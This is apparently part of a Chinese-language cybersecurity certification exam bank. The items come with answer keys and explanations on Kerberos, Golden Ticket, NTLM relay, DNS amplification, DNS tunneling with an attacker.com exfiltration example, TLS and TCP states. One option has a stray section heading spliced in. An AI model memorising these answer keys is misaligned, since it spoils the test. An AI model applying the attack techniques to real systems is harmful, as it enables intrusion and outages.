      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：OCSP（Online Certificate Status Protocol，在線憑證狀態協定）允許客戶端向 CA 的 OCSP 伺服器發送即時查詢請求，僅針對特定單張憑證的序號回傳其當前狀態（有效、已吊銷或未知），解決了傳統 CRL 檔案龐大且下載不及時的缺點。\n\n- **干擾項辨析**：\n\n  - (A) SCEP 用於網路設備向 CA 自動申請註冊憑證。\n\n  - (C) ACME 是自動化申請免費憑證的協定（如 Let's Encrypt）。\n\n  - (D) LDAP 是目錄存取協定。"
    },
    {
      "id": 32,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "身份驗證 / Kerberos 認證流程",
      "type": "single_choice",
      "question": "在 Windows Active Directory 網域環境使用的 Kerberos 認證協定中，客戶端在通過身分驗證服務（AS）後，取得的第一個關鍵憑證票據為何？",
      "options": {
        "A": "TGS (Ticket Granting Service)",
        "B": "TGT (Ticket Granting Ticket)",
        "C": "PAC (Privilege Attribute Certificate)",
        "D": "Service Ticket (ST)"
      },
      "answer": "B",
      "basis": "Kerberos 認證流程中，客戶端首先向身分驗證伺服器（Authentication Service, AS）發送請求。AS 驗證客戶端身分後，回傳由 KDC 的 `krbtgt` 帳號金鑰加密的 TGT（Ticket Granting Ticket，票據授權票據）。客戶端後續憑此 TGT 向 TGS 申請存取具體服務的服務票據（Service Ticket, ST）。",
      "distractor": "- (A) TGS 是提供票據的服務元件名稱，不是票據本身。\n\n  - (C) PAC 是封裝在票據內的使用者權限屬性憑證。\n\n  - (D) Service Ticket 是向 TGS 申請後才獲得的終端服務票據。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：Kerberos 認證流程中，客戶端首先向身分驗證伺服器（Authentication Service, AS）發送請求。AS 驗證客戶端身分後，回傳由 KDC 的 `krbtgt` 帳號金鑰加密的 TGT（Ticket Granting Ticket，票據授權票據）。客戶端後續憑此 TGT 向 TGS 申請存取具體服務的服務票據（Service Ticket, ST）。\n\n- **干擾項辨析**：\n\n  - (A) TGS 是提供票據的服務元件名稱，不是票據本身。\n\n  - (C) PAC 是封裝在票據內的使用者權限屬性憑證。\n\n  - (D) Service Ticket 是向 TGS 申請後才獲得的終端服務票據。"
    },
    {
      "id": 33,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "身份驗證 / 黃金票據攻擊",
      "type": "single_choice",
      "question": "在針對 Active Directory 域環境的滲透攻擊中，「黃金票據」（Golden Ticket）攻擊是攻擊者維持持久控制權的最高手段。攻擊者發動該攻擊前，必須竊取哪一個關鍵帳號的 NTLM Hash / AES 金鑰？",
      "options": {
        "A": "`Administrator`",
        "B": "`krbtgt`",
        "C": "`Guest`",
        "D": "`Domain Admins`"
      },
      "answer": "B",
      "basis": "黃金票據（Golden Ticket）是偽造的 TGT。由於 TGT 是由網域中的 `krbtgt` 服務帳號的 NTLM Hash 或 AES-256 金鑰加密簽名的，攻擊者一旦獲取了 `krbtgt` 帳號的密碼雜湊，即可自行離線簽發任意有效期限、任意群組權限（如 Enterprise Admins）的偽造 TGT，直接接管整個 Active Directory 樹系。",
      "distractor": "- (A) `Administrator` 是網域管理員，但其密碼被修改不會影響黃金票據；唯有重置兩次 `krbtgt` 密碼才能徹底廢止黃金票據。\n\n  - (C)、(D) 均無法用於簽發合法 TGT。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：黃金票據（Golden Ticket）是偽造的 TGT。由於 TGT 是由網域中的 `krbtgt` 服務帳號的 NTLM Hash 或 AES-256 金鑰加密簽名的，攻擊者一旦獲取了 `krbtgt` 帳號的密碼雜湊，即可自行離線簽發任意有效期限、任意群組權限（如 Enterprise Admins）的偽造 TGT，直接接管整個 Active Directory 樹系。\n\n- **干擾項辨析**：\n\n  - (A) `Administrator` 是網域管理員，但其密碼被修改不會影響黃金票據；唯有重置兩次 `krbtgt` 密碼才能徹底廢止黃金票據。\n\n  - (C)、(D) 均無法用於簽發合法 TGT。"
    },
    {
      "id": 34,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "身份驗證 / NTLM Relay 攻擊",
      "type": "single_choice",
      "question": "在區域網路中，若網域未強制啟用 SMB 簽章（SMB Signing），攻擊者誘使網域主機向偽造的 SMB 伺服器發起認證時，可利用何種工具與手法將身分驗證請求轉發至另一台伺服器，從而直接以受害主機身分執行程式碼？",
      "options": {
        "A": "Pass-the-Hash 攻擊",
        "B": "NTLM 中繼攻擊（NTLM Relay）",
        "C": "密碼噴灑攻擊（Password Spraying）",
        "D": "Kerberoasting 攻擊"
      },
      "answer": "B",
      "basis": "NTLM 中繼攻擊（NTLM Relay）：在內網中，攻擊者利用 LLMNR/NetBIOS 投毒誘使受害主機向攻擊者發起 NTLM 挑戰/回應認證。若網域未啟用 SMB 簽章，攻擊者可將受害者的 NetNTLM Hash 挑戰響應即時中繼轉發至目標伺服器，直接在目標主機上建立高權限會話。",
      "distractor": "- (A) Pass-the-Hash 是直接使用竊取到的本機 NTLM Hash 登入，不需要中間人中繼。\n\n  - (C) 密碼噴灑是以單一常見弱密碼嘗試登入大量使用者。\n\n  - (D) Kerberoasting 是針對 SPN 帳號請求服務票據並離線爆破其純文字密碼。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：NTLM 中繼攻擊（NTLM Relay）：在內網中，攻擊者利用 LLMNR/NetBIOS 投毒誘使受害主機向攻擊者發起 NTLM 挑戰/回應認證。若網域未啟用 SMB 簽章，攻擊者可將受害者的 NetNTLM Hash 挑戰響應即時中繼轉發至目標伺服器，直接在目標主機上建立高權限會話。\n\n- **干擾項辨析**：\n\n  - (A) Pass-the-Hash 是直接使用竊取到的本機 NTLM Hash 登入，不需要中間人中繼。\n\n  - (C) 密碼噴灑是以單一常見弱密碼嘗試登入大量使用者。\n\n  - (D) Kerberoasting 是針對 SPN 帳號請求服務票據並離線爆破其純文字密碼。"
    },
    {
      "id": 35,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "身份驗證 / 多因素認證 MFA",
      "type": "single_choice",
      "question": "Google Authenticator 等雙因素驗證 APP 普遍採用的動態密碼標準是 TOTP（Time-Based One-Time Password，RFC 6238）。此演算法計算 6 位數一次性密碼時，依賴的兩項核心輸入資料為何？",
      "options": {
        "A": "使用者密碼與隨機亂數",
        "B": "預先共享的私密金鑰（Secret Key）與當前 Unix 時間戳除以時間步長（通常 30 秒）的計數值",
        "C": "手機 IMEI 碼與簡訊驗證碼",
        "D": "伺服器 IP 位址與使用者帳號名稱  \n\n\n\n---\n\n\n\n## 領域三：網路協議分析與封包取證 (第 36 ~ 50 題)"
      },
      "answer": "B",
      "basis": "RFC 6238 TOTP 演算法定義為 $\\text{TOTP} = \\text{HOTP}(K, T)$，其中 $T = \\lfloor (\\text{CurrentUnixTime} - T_0) / X \\rfloor$。$K$ 是在建立 MFA 時透過 QR Code 掃描入手機的共享金鑰（Secret），$X$ 為時間步長（預設 30 秒）。手機與伺服器各自依賴相同的密鑰與當前時間，算出一致的 6 位數一次性動態密碼。",
      "distractor": "- (A) TOTP 生成與使用者的日常靜態密碼無關。\n\n  - (C) 簡訊驗證碼依賴電信網路，非離線 TOTP 原理。\n\n  - (D) IP 與帳號名稱不參與 TOTP 雜湊運算。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：RFC 6238 TOTP 演算法定義為 $\\text{TOTP} = \\text{HOTP}(K, T)$，其中 $T = \\lfloor (\\text{CurrentUnixTime} - T_0) / X \\rfloor$。$K$ 是在建立 MFA 時透過 QR Code 掃描入手機的共享金鑰（Secret），$X$ 為時間步長（預設 30 秒）。手機與伺服器各自依賴相同的密鑰與當前時間，算出一致的 6 位數一次性動態密碼。\n\n- **干擾項辨析**：\n\n  - (A) TOTP 生成與使用者的日常靜態密碼無關。\n\n  - (C) 簡訊驗證碼依賴電信網路，非離線 TOTP 原理。\n\n  - (D) IP 與帳號名稱不參與 TOTP 雜湊運算。"
    },
    {
      "id": 36,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路協議 / TCP 握手機制",
      "type": "single_choice",
      "question": "在標準的 TCP 三次握手建立連線過程中，客戶端向伺服器發送第一個封包（SYN 標誌置位），若初始序號為 $x$。伺服器正常回應的第二個封包中，其標誌位與確認序號（Acknowledgment Number）應為何？",
      "options": {
        "A": "SYN+ACK，確認序號為 $x$",
        "B": "SYN+ACK，確認序號為 $x+1$",
        "C": "ACK，確認序號為 $x+1$",
        "D": "RST，確認序號為 0"
      },
      "answer": "B",
      "basis": "在 TCP 三次握手中：\n\n  1. 客戶端發送 `[SYN] Seq=x`。\n\n  2. 伺服器回應 `[SYN, ACK]`，其確認號 $Ack = x + 1$（代表伺服器已確認收到客戶端的序號 $x$，期望下一個位元組為 $x+1$），同時伺服器產生自己的初始序號 $Seq=y$。\n\n  3. 客戶端回應 `[ACK] Seq=x+1, Ack=y+1`。",
      "distractor": "- (A) SYN 封包邏輯上消耗 1 個序號，確認序號必須為 $x+1$，若為 $x$ 則代表尚未確認該 SYN。\n\n  - (C) 第二步必須同時攜帶 SYN 旗標以同步伺服器端的序號。\n\n  - (D) RST 是拒絕連線或重置連線。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：在 TCP 三次握手中：\n\n  1. 客戶端發送 `[SYN] Seq=x`。\n\n  2. 伺服器回應 `[SYN, ACK]`，其確認號 $Ack = x + 1$（代表伺服器已確認收到客戶端的序號 $x$，期望下一個位元組為 $x+1$），同時伺服器產生自己的初始序號 $Seq=y$。\n\n  3. 客戶端回應 `[ACK] Seq=x+1, Ack=y+1`。\n\n- **干擾項辨析**：\n\n  - (A) SYN 封包邏輯上消耗 1 個序號，確認序號必須為 $x+1$，若為 $x$ 則代表尚未確認該 SYN。\n\n  - (C) 第二步必須同時攜帶 SYN 旗標以同步伺服器端的序號。\n\n  - (D) RST 是拒絕連線或重置連線。"
    },
    {
      "id": 37,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路協議 / TCP 狀態轉移",
      "type": "single_choice",
      "question": "主動發起關閉連線（Active Close）的一方，在發送最後一個 ACK 封包後，必須進入下列哪一個狀態並等待 $2\\times\\text{MSL}$（最大封包存活時間）的時間才能徹底釋放連線？",
      "options": {
        "A": "CLOSE_WAIT",
        "B": "TIME_WAIT",
        "C": "LAST_ACK",
        "D": "FIN_WAIT_2"
      },
      "answer": "B",
      "basis": "主動關閉端（Active Closer）在收到對方的 FIN 封包並發送最後一個 ACK 封包後，必須進入 `TIME_WAIT` 狀態。等待 $2\\times\\text{MSL}$ 的主要目的有二：\n\n  1. 保證最後一個 ACK 封包能送達被動關閉端，若遺失可重傳；\n\n  2. 讓本次連線產生在網路上的所有殘存封包全部自然消亡，避免干擾後續使用相同四元組（IP+Port）的新連線。",
      "distractor": "- (A) `CLOSE_WAIT` 是被動關閉端收到 FIN 並回送 ACK 後所處的狀態，等待本地應用程式關閉連線。\n\n  - (C) `LAST_ACK` 是被動關閉端發送 FIN 後等待最後 ACK 的狀態。\n\n  - (D) `FIN_WAIT_2` 是主動關閉端收到自己 FIN 的 ACK 後、等待對方發送 FIN 前的狀態。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：主動關閉端（Active Closer）在收到對方的 FIN 封包並發送最後一個 ACK 封包後，必須進入 `TIME_WAIT` 狀態。等待 $2\\times\\text{MSL}$ 的主要目的有二：\n\n  1. 保證最後一個 ACK 封包能送達被動關閉端，若遺失可重傳；\n\n  2. 讓本次連線產生在網路上的所有殘存封包全部自然消亡，避免干擾後續使用相同四元組（IP+Port）的新連線。\n\n- **干擾項辨析**：\n\n  - (A) `CLOSE_WAIT` 是被動關閉端收到 FIN 並回送 ACK 後所處的狀態，等待本地應用程式關閉連線。\n\n  - (C) `LAST_ACK` 是被動關閉端發送 FIN 後等待最後 ACK 的狀態。\n\n  - (D) `FIN_WAIT_2` 是主動關閉端收到自己 FIN 的 ACK 後、等待對方發送 FIN 前的狀態。"
    },
    {
      "id": 38,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路協議 / ARP 欺騙與防禦",
      "type": "single_choice",
      "question": "攻擊者在區域網路發送偽造的無故 ARP（Gratuitous ARP）應答，將網關 IP 映射至攻擊者自身 MAC 位址以實施中間人攻擊。在交換器（Switch）端防禦此類攻擊最有效的二層安全技術為何？",
      "options": {
        "A": "STP (Spanning Tree Protocol)",
        "B": "DAI (Dynamic ARP Inspection，搭配 DHCP Snooping)",
        "C": "802.1Q VLAN 標籤劃分",
        "D": "RIP 路由協議"
      },
      "answer": "B",
      "basis": "DAI（Dynamic ARP Inspection，動態 ARP 檢查）是交換器防範 ARP 欺騙的最有效機制。它依賴 DHCP Snooping 建立的 IP-MAC-Port 綁定資料庫，當交換器收到 ARP 封包時，檢查 ARP 負載內的 IP 與 MAC 是否與綁定表一致，若不一致則直接將偽造的 ARP 封包丟棄。",
      "distractor": "- (A) STP 用於防止二層網路環路，與 ARP 安全無關。\n\n  - (C) VLAN 只能隔離廣播網域，同 VLAN 內部依然會遭受 ARP 欺騙。\n\n  - (D) RIP 屬於三層距離向量路由協議。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：DAI（Dynamic ARP Inspection，動態 ARP 檢查）是交換器防範 ARP 欺騙的最有效機制。它依賴 DHCP Snooping 建立的 IP-MAC-Port 綁定資料庫，當交換器收到 ARP 封包時，檢查 ARP 負載內的 IP 與 MAC 是否與綁定表一致，若不一致則直接將偽造的 ARP 封包丟棄。\n\n- **干擾項辨析**：\n\n  - (A) STP 用於防止二層網路環路，與 ARP 安全無關。\n\n  - (C) VLAN 只能隔離廣播網域，同 VLAN 內部依然會遭受 ARP 欺騙。\n\n  - (D) RIP 屬於三層距離向量路由協議。"
    },
    {
      "id": 39,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路協議 / DNS 放大攻擊",
      "type": "single_choice",
      "question": "DNS 分散式阻斷服務放大攻擊（DNS Amplification Attack）主要利用 UDP 協定的無狀態特性與偽造來源 IP。攻擊者發送哪一種類型的 DNS 查詢請求最容易獲得數十倍放大的回應封包？",
      "options": {
        "A": "`A` 記錄查詢",
        "B": "`ANY` 記錄查詢（搭配 EDNS0 大緩衝區支援）",
        "C": "`PTR` 反向解析查詢",
        "D": "`CNAME` 別名查詢"
      },
      "answer": "B",
      "basis": "DNS 放大攻擊中，攻擊者向開放遞歸解析器發送極短的請求（約 60 bytes），查詢類型指定為 `ANY`（請求該網域的所有資源記錄，包括 A、MX、NS、TXT、DNSKEY 等），並配合 EDNS0 宣告支援大於 512 bytes 的 UDP 緩衝區。伺服器回應的封包大小常可達 3000 ~ 4000 bytes，放大倍率高達 50 ~ 70 倍。",
      "distractor": "- (A) `A` 記錄回應通常僅數十位元組，放大倍率低。\n\n  - (C)、(D) 回應內容有限，無法產生劇烈放大效果。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：DNS 放大攻擊中，攻擊者向開放遞歸解析器發送極短的請求（約 60 bytes），查詢類型指定為 `ANY`（請求該網域的所有資源記錄，包括 A、MX、NS、TXT、DNSKEY 等），並配合 EDNS0 宣告支援大於 512 bytes 的 UDP 緩衝區。伺服器回應的封包大小常可達 3000 ~ 4000 bytes，放大倍率高達 50 ~ 70 倍。\n\n- **干擾項辨析**：\n\n  - (A) `A` 記錄回應通常僅數十位元組，放大倍率低。\n\n  - (C)、(D) 回應內容有限，無法產生劇烈放大效果。"
    },
    {
      "id": 40,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路協議 / DNSSEC 技術",
      "type": "single_choice",
      "question": "為防範 DNS 快取污染（DNS Cache Poisoning）與劫持，DNSSEC 引入了密碼學驗證機制。在 DNSSEC 記錄中，用來對特定資源記錄集（RRset）進行數位簽章的記錄類型為何？",
      "options": {
        "A": "DNSKEY",
        "B": "RRSIG",
        "C": "DS (Delegation Signer)",
        "D": "NSEC / NSEC3"
      },
      "answer": "B",
      "basis": "在 DNSSEC 規範中，`RRSIG`（Resource Record Signature）記錄存放的是對特定資源記錄集（如所有的 A 記錄）進行非對稱密碼學簽名後的數位簽章資料。解析器使用區域的公鑰（`DNSKEY`）驗證 `RRSIG`，確保解析結果未被篡改。",
      "distractor": "- (A) `DNSKEY` 存放的是用於驗證簽章的公開金鑰本身。\n\n  - (C) `DS`（Delegation Signer）存放於父網域，用於建立信任鏈。\n\n  - (D) `NSEC` 用於提供否定應答（證明某記錄不存在）的認證。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：在 DNSSEC 規範中，`RRSIG`（Resource Record Signature）記錄存放的是對特定資源記錄集（如所有的 A 記錄）進行非對稱密碼學簽名後的數位簽章資料。解析器使用區域的公鑰（`DNSKEY`）驗證 `RRSIG`，確保解析結果未被篡改。\n\n- **干擾項辨析**：\n\n  - (A) `DNSKEY` 存放的是用於驗證簽章的公開金鑰本身。\n\n  - (C) `DS`（Delegation Signer）存放於父網域，用於建立信任鏈。\n\n  - (D) `NSEC` 用於提供否定應答（證明某記錄不存在）的認證。"
    },
    {
      "id": 41,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路分析 / Wireshark 過濾語法",
      "type": "single_choice",
      "question": "若鑑識人員想在 Wireshark 中過濾出「來源或目的 IP 為 192.168.1.100，且包含 HTTP POST 請求」的所有封包，應輸入下列哪一條顯示過濾器（Display Filter）？",
      "options": {
        "A": "`ip.addr == 192.168.1.100 and http.request.method == \"POST\"`",
        "B": "`ip.host = 192.168.1.100 && http.method == POST`",
        "C": "`host 192.168.1.100 and tcp port 80`",
        "D": "`ip.src == 192.168.1.100 or http.post`"
      },
      "answer": "A",
      "basis": "Wireshark 顯示過濾器（Display Filter）的語法中，過濾 IP 雙向使用 `ip.addr == 192.168.1.100`，過濾 HTTP 請求方法使用 `http.request.method == \"POST\"`，兩者以邏輯運算子 `and` 或 `&&` 連接。",
      "distractor": "- (B) `ip.host` 非標準欄位，POST 缺少引號。\n\n  - (C) `host 192.168.1.100 and tcp port 80` 是 BPF 捕獲過濾器（Capture Filter）語法，且無法限定 POST 方法。\n\n  - (D) `or` 為邏輯或，且 `http.post` 非有效語法。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Wireshark 顯示過濾器（Display Filter）的語法中，過濾 IP 雙向使用 `ip.addr == 192.168.1.100`，過濾 HTTP 請求方法使用 `http.request.method == \"POST\"`，兩者以邏輯運算子 `and` 或 `&&` 連接。\n\n- **干擾項辨析**：\n\n  - (B) `ip.host` 非標準欄位，POST 缺少引號。\n\n  - (C) `host 192.168.1.100 and tcp port 80` 是 BPF 捕獲過濾器（Capture Filter）語法，且無法限定 POST 方法。\n\n  - (D) `or` 為邏輯或，且 `http.post` 非有效語法。"
    },
    {
      "id": 42,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路取證 / 隱蔽通道技術",
      "type": "single_choice",
      "question": "在被嚴格管制的企業內網中，若所有對外 TCP 端口均被防火牆封鎖，但允許向外網合法遞歸解析 DNS，攻擊者常使用何種技術將敏感機密數據編碼後放置於 DNS 查詢子網域名稱中逐批外傳？",
      "options": {
        "A": "DNS 隧道隱寫（DNS Tunneling / Data Exfiltration）",
        "B": "ARP 毒化隧道",
        "C": "SSH 動態轉發",
        "D": "BGP 路由劫持"
      },
      "answer": "A",
      "basis": "DNS 隧道隱寫（DNS Tunneling）：企業網路通常會放行對內部或外部 DNS 伺服器的 53 端口查詢。攻擊者將欲外洩的機密數據（如信用卡、帳密）進行 Base32/Base64/Hex 編碼後，作為子網域名稱發起解析請求（例如 `NVYWK4RO...sub.attacker.com`）。由攻擊者架設的權威 DNS 伺服器在接收到遞歸查詢日誌後，即可拼裝還原出全部機密數據。",
      "distractor": "- (B) ARP 只能在同一個廣播域（二層網路）傳播，無法穿透路由器或防火牆出網。\n\n  - (C) SSH 依賴 TCP 端口（通常 22），題目已說明對外 TCP 均被防火牆封鎖。\n\n  - (D) BGP 劫持用於廣域路由竄改，非客戶端外洩資料的手法。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：DNS 隧道隱寫（DNS Tunneling）：企業網路通常會放行對內部或外部 DNS 伺服器的 53 端口查詢。攻擊者將欲外洩的機密數據（如信用卡、帳密）進行 Base32/Base64/Hex 編碼後，作為子網域名稱發起解析請求（例如 `NVYWK4RO...sub.attacker.com`）。由攻擊者架設的權威 DNS 伺服器在接收到遞歸查詢日誌後，即可拼裝還原出全部機密數據。\n\n- **干擾項辨析**：\n\n  - (B) ARP 只能在同一個廣播域（二層網路）傳播，無法穿透路由器或防火牆出網。\n\n  - (C) SSH 依賴 TCP 端口（通常 22），題目已說明對外 TCP 均被防火牆封鎖。\n\n  - (D) BGP 劫持用於廣域路由竄改，非客戶端外洩資料的手法。"
    },
    {
      "id": 43,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路分析 / TLS 握手特徵",
      "type": "single_choice",
      "question": "在 TLS 1.2 握手流程中，客戶端在發送的 `Client Hello` 訊息中，哪一個明文延伸欄位（Extension）會直接暴露出使用者嘗試連線的網站完整主機名稱（FQDN），常被網路防火牆用於阻擋特定網站？",
      "options": {
        "A": "ALPN (Application-Layer Protocol Negotiation)",
        "B": "SNI (Server Name Indication)",
        "C": "Key Share",
        "D": "Supported Versions"
      },
      "answer": "B",
      "basis": "在虛擬主機普及的背景下，同一 IP 上可能託管多個不同網域的 HTTPS 網站。TLS 引入了 SNI（Server Name Indication，伺服器名稱指示）延伸欄位。客戶端在建立 TCP 後發送的 `Client Hello` 中，以**明文**方式填寫目標伺服器的 FQDN（如 `www.bank.com`），以便伺服器回傳正確的 SSL 憑證。由於此欄位未加密，防火牆與 IDS 常透過讀取 SNI 明文來精準辨識並阻斷特定受限制網站。",
      "distractor": "- (A) ALPN 用於協商應用層協定（如 HTTP/2 或 HTTP/1.1）。\n\n  - (C) Key Share 存放 ECDH 臨時公鑰參數。\n\n  - (D) Supported Versions 宣告支援的 TLS 版本號。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：在虛擬主機普及的背景下，同一 IP 上可能託管多個不同網域的 HTTPS 網站。TLS 引入了 SNI（Server Name Indication，伺服器名稱指示）延伸欄位。客戶端在建立 TCP 後發送的 `Client Hello` 中，以**明文**方式填寫目標伺服器的 FQDN（如 `www.bank.com`），以便伺服器回傳正確的 SSL 憑證。由於此欄位未加密，防火牆與 IDS 常透過讀取 SNI 明文來精準辨識並阻斷特定受限制網站。\n\n- **干擾項辨析**：\n\n  - (A) ALPN 用於協商應用層協定（如 HTTP/2 或 HTTP/1.1）。\n\n  - (C) Key Share 存放 ECDH 臨時公鑰參數。\n\n  - (D) Supported Versions 宣告支援的 TLS 版本號。"
    },
    {
      "id": 44,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路分析 / TLS 1.3 進步特性",
      "type": "single_choice",
      "question": "相較於 TLS 1.2，TLS 1.3 在安全與連線延遲上有重大突破。下列關於 TLS 1.3 的敘述何者**錯誤**？",
      "options": {
        "A": "完整握手往返時間從 2-RTT 縮減為 1-RTT，並支援 0-RTT 早期數據恢復",
        "B": "徹底廢棄了靜態 RSA 金鑰交換與不安全的對稱加密（如 RC4、3DES、CBC 模式）",
        "C": "將 Server Certificate 憑證訊息移入加密握手階段，不再以明文傳輸憑證內容",
        "D": "依然保留了 MD5 與 SHA-1 作為握手雜湊完整性校驗算法"
      },
      "answer": "D",
      "basis": "TLS 1.3 進行了徹底的安全清洗，徹底廢除了所有已被證實存在弱點的加密與雜湊演算法，包括 MD5、SHA-1、RC4、DES/3DES 以及所有靜態 RSA 金鑰交換。TLS 1.3 的握手完整性驗證僅支援 SHA-256、SHA-384 等現代安全雜湊函數。因此 (D) 敘述錯誤，符合題意。",
      "distractor": "- (A)、(B)、(C) 均為 TLS 1.3 的真實重要新特性。",
      "full_solution": "- **正確答案**：**(D)**\n\n- **正解依據**：TLS 1.3 進行了徹底的安全清洗，徹底廢除了所有已被證實存在弱點的加密與雜湊演算法，包括 MD5、SHA-1、RC4、DES/3DES 以及所有靜態 RSA 金鑰交換。TLS 1.3 的握手完整性驗證僅支援 SHA-256、SHA-384 等現代安全雜湊函數。因此 (D) 敘述錯誤，符合題意。\n\n- **干擾項辨析**：\n\n  - (A)、(B)、(C) 均為 TLS 1.3 的真實重要新特性。"
    },
    {
      "id": 45,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路分析 / 封包特徵識別",
      "type": "single_choice",
      "question": "在 Wireshark 分析封包時，若發現某一 TCP 連線中，發送端不斷發送負載極短的小封包，且 TCP 標誌中 PSH (Push) 旗標持續置位，隨後接收端立即回傳大量回顯字元，這種流量行為最符合下列哪一種應用程式？",
      "options": {
        "A": "批次 FTP 大檔傳輸",
        "B": "互動式遠端終端連線（如 Telnet 或反向互動 Shell）",
        "C": "靜態網頁圖片下載",
        "D": "DNS 區域傳送（AXFR）"
      },
      "answer": "B",
      "basis": "在 TCP 協議中，PSH（Push）旗標通知作業系統協定棧將緩衝區內的數據立即向上層應用交付，而不要等待填滿 MTU。互動式遠端連線（如 Telnet、SSH 終端或反向 Shell）每當使用者敲擊一個按鍵時，發送端就會立即發送帶有 PSH 的微小封包，伺服器處理後立即回顯字元，符合題意描述特徵。",
      "distractor": "- (A) FTP 大檔傳輸會儘量發送 1460 bytes 的滿額 MSS 封包以提升吞吐量，不會頻繁發送極小封包。\n\n  - (C) 網頁圖片下載通常是持續的大量連續 HTTP/TCP 封包串流。\n\n  - (D) AXFR 採用標準的 DNS 格式長封包。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：在 TCP 協議中，PSH（Push）旗標通知作業系統協定棧將緩衝區內的數據立即向上層應用交付，而不要等待填滿 MTU。互動式遠端連線（如 Telnet、SSH 終端或反向 Shell）每當使用者敲擊一個按鍵時，發送端就會立即發送帶有 PSH 的微小封包，伺服器處理後立即回顯字元，符合題意描述特徵。\n\n- **干擾項辨析**：\n\n  - (A) FTP 大檔傳輸會儘量發送 1460 bytes 的滿額 MSS 封包以提升吞吐量，不會頻繁發送極小封包。\n\n  - (C) 網頁圖片下載通常是持續的大量連續 HTTP/TCP 封包串流。\n\n  - (D) AXFR 採用標準的 DNS 格式長封包。"
    },
    {
      "id": 46,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路分析 / SYN Flood 檢測",
      "type": "single_choice",
      "question": "當伺服器遭受大規模 SYN Flood 分散式阻斷服務攻擊時，網路管理員在伺服器上執行 `netstat -nat` 指令，將會觀察到哪一種狀態的 TCP 連線數量急劇暴增並耗盡連線池？",
      "options": {
        "A": "ESTABLISHED",
        "B": "SYN_RECV",
        "C": "FIN_WAIT_1",
        "D": "CLOSED"
      },
      "answer": "B",
      "basis": "SYN Flood 攻擊中，攻擊者向目標發送大量偽造來源 IP 的 TCP SYN 請求。伺服器收到後分配 TCB 緩衝資源，回應 SYN+ACK 並進入 `SYN_RECV`（或 `SYN_RECEIVED`）狀態，等待永遠不會到來的 ACK。伺服器的半連線佇列（SYN Queue）因此被大量的 `SYN_RECV` 連線迅速佔滿，拒絕正常使用者的連線請求。",
      "distractor": "- (A) `ESTABLISHED` 是完整完成三次握手後的狀態。\n\n  - (C) `FIN_WAIT_1` 是斷開連線過程中的狀態。\n\n  - (D) `CLOSED` 是無連線狀態。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：SYN Flood 攻擊中，攻擊者向目標發送大量偽造來源 IP 的 TCP SYN 請求。伺服器收到後分配 TCB 緩衝資源，回應 SYN+ACK 並進入 `SYN_RECV`（或 `SYN_RECEIVED`）狀態，等待永遠不會到來的 ACK。伺服器的半連線佇列（SYN Queue）因此被大量的 `SYN_RECV` 連線迅速佔滿，拒絕正常使用者的連線請求。\n\n- **干擾項辨析**：\n\n  - (A) `ESTABLISHED` 是完整完成三次握手後的狀態。\n\n  - (C) `FIN_WAIT_1` 是斷開連線過程中的狀態。\n\n  - (D) `CLOSED` 是無連線狀態。"
    },
    {
      "id": 47,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路協議 / HTTP/2 多路復用",
      "type": "single_choice",
      "question": "HTTP/2 相較於 HTTP/1.1 顯著提高了傳輸效能，主要歸功於下列哪一項核心架構改進？",
      "options": {
        "A": "使用 UDP 作為底層傳輸協定",
        "B": "在單一 TCP 連線上透過二進位分幀（Binary Framing）實現多路復用（Multiplexing），解決隊頭阻塞（Head-of-Line Blocking）",
        "C": "停用所有 Cookie 機制以精簡傳輸",
        "D": "強制要求所有請求均使用壓縮後的 JSON 格式"
      },
      "answer": "B",
      "basis": "HTTP/2 引入了二進位分幀層（Binary Framing Layer），將訊息分割為獨立的幀（Frames），並在單一 TCP 連線上交錯傳輸多個雙向請求與響應（多路復用）。這徹底解決了 HTTP/1.1 中因瀏覽器併發連線數限制（通常 6 個）及請求必須排隊等待的 HTTP 隊頭阻塞問題。",
      "distractor": "- (A) HTTP/3（QUIC）才是基於 UDP，HTTP/2 底層依然是 TCP。\n\n  - (C) HTTP/2 依然支援 Cookie，並引入 HPACK 進行頭部壓縮。\n\n  - (D) HTTP/2 與承載的業務資料格式（JSON/HTML/XML）無關。",
